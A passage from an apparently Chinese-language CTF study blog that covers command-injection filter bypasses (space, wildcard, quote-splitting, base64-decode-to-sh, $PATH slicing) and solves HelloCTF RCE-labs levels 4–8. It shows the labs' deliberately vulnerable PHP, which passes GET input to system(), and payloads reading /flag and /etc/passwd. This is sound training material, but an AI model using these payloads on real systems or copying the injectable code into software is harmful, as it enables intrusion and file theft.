<td>URL 编码的空格，常见于Web请求中。</td>
</tr>
<tr>
<td><code>&quot;$@&quot;</code></td>
<td><code>&quot;ls$@/etc&quot;</code></td>
<td><code>$@</code> 代表所有参数，某些情况下解析成空格。</td>
</tr>
<tr>
<td><code>$&#123;PATH:0:1&#125;</code></td>
<td><code>ls$&#123;PATH:0:1&#125;/etc</code></td>
<td>从环境变量中提取空格字符（原理复杂，略不常用）。</td>
</tr>
<tr>
<td><code>&#123; , &#125;</code></td>
<td><code>&#123;cat,flag.php&#125;</code></td>
<td>用逗号实现了空格功能</td>
</tr>
</tbody></table>
<h4 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /passwd：</span><br><span class="line"></span><br><span class="line">??? /e??/?a????</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /e*/pa*</span><br></pre></td></tr></table></figure>



<h4 id="管道符绕过"><a href="#管道符绕过" class="headerlink" title="管道符绕过"></a>管道符绕过</h4><p><strong>windows</strong></p>
<ol>
<li>|：直接执行后面语句</li>
<li>||：前面执行失败，则执行后面</li>
<li>&amp;：两个都执行，如果前面的命令为假，则直接执行后面</li>
<li>&amp;&amp;如果前面的语句为假则直接出错，也不执行后面，前面为真，则都执行。</li>
</ol>
<p><strong>Linux</strong></p>
<ol>
<li>|：显示后面语句的结果</li>
<li>||：当前面直接出错，执行后面的语句</li>
<li>&amp;：两个都执行，同win</li>
<li>&amp;&amp;：前面出错，则不执行后面，两个都为true才都执行，前面只能为true。</li>
<li>&#96;：在将括号内的命令处理完毕之后，会将返回的信息传给bash，再次执行。</li>
<li>;：执行完前面执行后面。</li>
</ol>
<h4 id="变量拼接绕过"><a href="#变量拼接绕过" class="headerlink" title="变量拼接绕过"></a>变量拼接绕过</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a=fl;b=ag</span><br><span class="line"></span><br><span class="line">system(<span class="built_in">cat</span> <span class="string">&#x27;$a.$b.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(sy.(st).em)(<span class="built_in">whoami</span>);//</span><br><span class="line"></span><br><span class="line">c<span class="string">&#x27;&#x27;</span>a<span class="string">&#x27;&#x27;</span>t /etc/passwd//单引</span><br><span class="line"></span><br><span class="line">c<span class="string">&quot;&quot;</span>a<span class="string">&quot;&quot;</span>t /etc/passwd//双引</span><br><span class="line"></span><br><span class="line">c``a``t /etc/passwd/反单引</span><br><span class="line"></span><br><span class="line">c\a\t /etc/passwd//反斜线</span><br></pre></td></tr></table></figure>



<h4 id="cat的代替"><a href="#cat的代替" class="headerlink" title="cat的代替"></a>cat的代替</h4><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">more:</span>一页一页的显示档案内容</span><br><span class="line"><span class="symbol">less:</span>与 more 类似		</span><br><span class="line"><span class="symbol">head:</span>查看头几行				</span><br><span class="line"><span class="symbol">tac:</span>从最后一行开始显示，可以看出 tac 是 cat 的反向显示			</span><br><span class="line"><span class="symbol">tail:</span>查看尾几行				</span><br><span class="line">nl：显示的时候，顺便输出行号			</span><br><span class="line"><span class="symbol">od:</span>以二进制的方式读取档案内容				</span><br><span class="line"><span class="symbol">vi:</span>一种编辑器，这个也可以查看				</span><br><span class="line"><span class="symbol">vim:</span>一种编辑器，这个也可以查看				</span><br><span class="line"><span class="symbol">sort:</span>可以查看				</span><br><span class="line"><span class="symbol">uniq:</span>可以查看</span><br><span class="line">file -f:显示文件类型信息，若出错会报告具体内容</span><br><span class="line"><span class="symbol">tailf:</span>类似于 tail -f，实时显示文件尾部内容</span><br></pre></td></tr></table></figure>



<h4 id="Base64编码绕过"><a href="#Base64编码绕过" class="headerlink" title="Base64编码绕过"></a>Base64编码绕过</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;ls&#x27;</span> | <span class="built_in">base64</span></span><br><span class="line">-&gt;bHMK</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bHMK&#x27;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">-&gt; flag.ph  test.php  ......</span><br><span class="line"></span><br><span class="line">//利用</span><br><span class="line"><span class="built_in">echo</span>$IFS<span class="variable">$1Y2F0IGZsYWcucGhw</span>|<span class="built_in">base64</span>$IFS<span class="variable">$1</span>-d|sh</span><br></pre></td></tr></table></figure>



<h4 id="linux特殊变量绕过"><a href="#linux特殊变量绕过" class="headerlink" title="linux特殊变量绕过"></a>linux特殊变量绕过</h4><table>
<thead>
<tr>
<th>变量</th>
<th>含义</th>
<th>示例输出</th>
</tr>
</thead>
<tbody><tr>
<td><code>$&#123;#&#125;</code></td>
<td>传递给脚本或函数的参数个数</td>
<td><code>0</code>（参数为空时）</td>
</tr>
<tr>
<td><code>$&#123;?&#125;</code></td>
<td>上一个命令的退出状态</td>
<td><code>0</code>（正常退出）或 <code>1</code>（异常退出）</td>
</tr>
<tr>
<td><code>$&#123;_&#125;</code></td>
<td>上一个命令的最后一个参数</td>
<td>上一个命令的最后一个参数值</td>
</tr>
<tr>
<td><code>$&#123;0&#125;</code></td>
<td>当前脚本或 shell 的名字</td>
<td><code>bash</code> 或脚本名</td>
</tr>
<tr>
<td><code>$&#123;1&#125; 到 $&#123;9&#125;</code></td>
<td>传递给脚本或函数的第 1 到第 9 个参数</td>
<td>第 1 到第 9 个参数值</td>
</tr>
<tr>
<td><code>$&#123;@&#125;</code></td>
<td>传递给脚本或函数的所有参数（以列表形式）</td>
<td>所有参数值</td>
</tr>
<tr>
<td><code>$&#123;*&#125;</code></td>
<td>传递给脚本或函数的所有参数（以字符串形式）</td>
<td>所有参数作为单个字符串</td>
</tr>
<tr>
<td><code>$&#123;$&#125;</code></td>
<td>当前 shell 的进程 ID (PID)</td>
<td>进程 ID 值</td>
</tr>
<tr>
<td><code>$&#123;!&#125;</code></td>
<td>上一个后台运行的进程的进程 ID (PID)</td>
<td>后台进程的 PID</td>
</tr>
<tr>
<td><code>$&#123;-&#125;</code></td>
<td>当前 shell 的选项标志</td>
<td><code>hB</code>（表示 shell 选项标志）</td>
</tr>
</tbody></table>
<h4 id="PATH"><a href="#PATH" class="headerlink" title="$PATH"></a>$PATH</h4><p>主要是截取环境变量中的字幕来拼接命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/opt/jdk-21/bin         //假如是这样的</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;PATH:2:1&#125;</span></span><br><span class="line">-&gt;p</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;PATH:3:1&#125;</span></span><br><span class="line">-&gt;t</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;PATH:3:2&#125;</span></span><br><span class="line">-&gt;t/</span><br></pre></td></tr></table></figure>

<p>**如果没有特定字母?**这个时候我们可以自己取构造一个PATH。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/abcdefghijklmn/opq/rst/uvw/xyz/0123456789</span><br></pre></td></tr></table></figure>





<h2 id="RCE-labs打靶"><a href="#RCE-labs打靶" class="headerlink" title="RCE-labs打靶"></a>RCE-labs打靶</h2><h3 id="RCE-labs-level4-SHELL-运算符"><a href="#RCE-labs-level4-SHELL-运算符" class="headerlink" title="RCE-labs-level4 SHELL 运算符"></a>RCE-labs-level4 SHELL 运算符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-08-11 14:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/RCE-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--- HelloCTF - RCE靶场 : 命令执行 - SHELL 运算符 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">https://www.runoob.com/linux/linux-shell-basic-operators.html</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">SHELL 运算符 可以用于控制命令的执行流程，使得你能够根据条件执行不同的命令。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&amp;&amp;（逻辑与运算符）: 只有当第一个命令 cmd_1 执行成功（返回值为 0）时，才会执行第二个命令 cmd_2。例:  mkdir test &amp;&amp; cd test</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">||（逻辑或运算符）: 只有当第一个命令 cmd_1 执行失败（返回值不为 0）时，才会执行第二个命令 cmd_2。例:  cd nonexistent_directory || echo &quot;Directory not found&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&amp;（后台运行符）: 将命令 cmd_1 放到后台执行，Shell 立即执行 cmd_2，两个命令并行执行。例:  sleep 10 &amp; echo &quot;This will run immediately.&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">;（命令分隔符）: 无论前一个命令 cmd_1 是否成功，都会执行下一个命令 cmd_2。例:  echo &quot;Hello&quot; ; echo &quot;World&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">try GET:</span></span><br><span class="line"><span class="comment">    ?ip=8.8.8.8</span></span><br><span class="line"><span class="comment">flag is /flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_server</span>(<span class="params"><span class="variable">$ip</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -c 1 <span class="subst">$ip</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) ? <span class="title function_ invoke__">hello_server</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>直接拼接命令就可以了，<code>/?ip=127.0.0.1| cat /flag</code></p>
<h3 id="RCE-labs-level5-终端特性-空字符忽略和通配符"><a href="#RCE-labs-level5-终端特性-空字符忽略和通配符" class="headerlink" title="RCE-labs-level5 终端特性_空字符忽略和通配符"></a>RCE-labs-level5 终端特性_空字符忽略和通配符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-08-11 14:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/RCE-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--- HelloCTF - RCE靶场 : 命令执行 - 终端特性_空字符忽略和通配符 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">在Shell中，单/双引号 &quot;/&#x27; 可以用来定义一个空字符串或保护包含空格或特殊字符的字符串。</span></span><br><span class="line"><span class="comment">例如：echo &quot;$&quot;a 会输出 $a，而 echo $a 会输出变量a的值，当只有&quot;&quot;则表示空字符串，Shell会忽略它。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*（星号）: 匹配零个或多个字符。例子: *.txt。</span></span><br><span class="line"><span class="comment">?（问号）: 匹配单个字符。例子: file?.txt。</span></span><br><span class="line"><span class="comment">[]（方括号）: 匹配方括号内的任意一个字符。例子: file[1-3].txt。</span></span><br><span class="line"><span class="comment">[^]（取反方括号）: 匹配不在方括号内的字符。例子: file[^a-c].txt。</span></span><br><span class="line"><span class="comment">&#123;&#125;（大括号）: 匹配大括号内的任意一个字符串。例子: file&#123;1,2,3&#125;.txt。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">通过组合上述技巧，我们可以用于绕过CTF中一些简单的过滤：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">system(&quot;c&#x27;&#x27;at /e&#x27;t&#x27;c/pass?d&quot;);</span></span><br><span class="line"><span class="comment">system(&quot;/???/?at /e&#x27;t&#x27;c/pass?d&quot;);</span></span><br><span class="line"><span class="comment">system(&quot;/???/?at /e&#x27;t&#x27;c/*ss*&quot;);</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>waf了flag关键字，用通配符绕过，或者反斜杠转义绕过。</p>
<p><code>/?cmd=cat /f???</code></p>
<p><code>/?cmd=cat /fla\g</code></p>
<h3 id="RCE-labs-level6"><a href="#RCE-labs-level6" class="headerlink" title="RCE-labs-level6"></a>RCE-labs-level6</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-08-11 14:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/RCE-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--- HelloCTF - RCE靶场 : 挑战关 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">刚才，学了什么来着！？</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这关给的很很巧妙，我刚开始没仔细看，以为是吧数字字母全部waf掉了，结果四也想不到怎么构造，结果一看wp，发现还有<code>a</code>以及数字没有被过滤。</p>
<p>于是就可以构造以下命令：</p>
<p><code>/???/?a??64 /??a?</code> -&gt;&#x2F;bin&#x2F;base64 &#x2F;flag</p>
<p><code>/???/?a? /??a?</code> -&gt; &#x2F;bin&#x2F;cat &#x2F;flag</p>
<h3 id="RCE-labs-level7-空格绕过"><a href="#RCE-labs-level7-空格绕过" class="headerlink" title="RCE-labs-level7 空格绕过"></a>RCE-labs-level7 空格绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Geesec&#123;e2f4a676-<span class="number">8e5</span>d-<span class="number">4</span>b6c-b57b-d1dd6959cd83&#125; <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-08-11 14:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/RCE-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--- HelloCTF - RCE靶场 : 命令执行 - 终端特殊字符 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">在遇到空格被过滤的情况下，通常使用 %09 也就是TAB的URL编码来绕过，在终端环境下 空格 被视为一个命令分隔符，本质上由 $IFS 变量控制，而 $IFS 的默认值是空格、制表符和换行符，所以我们还可以通过直接键入 $IFS 来绕过空格过滤。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag| /&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可用<code>$&#123;IFS&#125;</code>、<code>$IFS</code>、<code>%09</code></p>
<h3 id="RCE-labs-level8-错误重定向"><a href="#RCE-labs-level8-错误重定向" class="headerlink" title="RCE-labs-level8 错误重定向"></a>RCE-labs-level8 错误重定向</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-08-11 14:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/RCE-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--- HelloCTF - RCE靶场 : 命令执行 - 重定向 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">大多数 UNIX 系统命令从你的终端接受输入并将所产生的输出发送回​​到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端 —— 这些是命令有回显的基础。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">如果希望执行某个命令，但又不希望在屏幕上显示输出结果，那么可以将输出重定向到 /dev/null：</span></span><br><span class="line"><span class="comment">$ command &gt; /dev/null</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">/dev/null 是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到。但是 /dev/null 文件非常有用，将命令的输出重定向到它，会起到&quot;禁止输出&quot;的效果。</span></span><br><span class="line"><span class="comment">如果希望屏蔽 stdout 和 stderr，可以这样写：</span></span><br><span class="line"><span class="comment">$ command &gt; /dev/null 2&gt;&amp;1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">/*&gt;/dev/null 将不会有任何回显，但会回显错误，加上 2&gt;&amp;1 后连错误也会被屏蔽掉*/</span></span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>.<span class="string">&quot;&gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>用 ;来分隔重定向， <code>/?cmd=cat /flag;</code></p>
<p>这里贴一下wp中的总结：</p>
<p>在Linux中文件描述符(File Descriptor)是用于标识和访问打开文件或输入&#x2F;输出设备的整数值，每个打开的文件或设备都会被分配一个唯一的文件描述符，Linux 中的文件描述符使用非负整数值来表示其中特定的文件描述符有以下含义</p>
<ul>
<li>标准输入(stdin)：文件描述符为0，通常关联着终端键盘输入</li>
<li>标准输出(stdout)：文件描述符为1，通常关联着终端屏幕输出</li>
<li>标准错误(stderr)：文件描述符为2，通常关联着终端屏幕输出</li>
</ul>
<p>平时我们使用的”&lt;”和”&gt;”其实就相当于是使用”0&lt;”和”1&gt;”，下面是几种常见的使用示例：</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>示例</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td><code>&gt;</code></td>
<td><code>echo &quot;Hello&quot; &gt; file.txt</code></td>
<td>将 <code>echo</code> 的输出重定向到 <code>file.txt</code> 文件</td>
</tr>
<tr>
